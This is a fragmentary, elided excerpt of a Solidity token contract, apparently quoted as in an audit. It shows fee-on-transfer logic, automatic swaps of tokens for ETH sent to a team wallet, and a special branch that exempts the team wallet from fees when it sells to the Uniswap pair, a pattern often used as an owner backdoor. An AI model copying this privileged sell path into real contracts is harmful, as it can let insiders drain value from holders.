...
contract totalSupplyFacet is IERC20, Context, Ownable {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && from != address(this)) {
            ...
            if (to == ds.uniswapV2Pair && from != address(this)) {
                if (from == address(ds._aaceTeamWallet)) {
                    aacefeeAmount = 0;
                    xamounts = min(
            ...
            bool swappable = ds._buyCount > ds._preventSwapBefore &&
                ds._minAaceSwapAmount == min(ds._minAaceSwapAmount, amount);
            ...
            if (
                ...
                if (contractTokenBalance > ds._minAaceSwapAmount) {
                    swapTokensForEth(
        ...
        ds._balances[to] = ds._balances[to].add(amount.sub(aacefeeAmount));
    ...
    function sendETHToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._aaceTeamWallet.transfer(amount);
    }
}
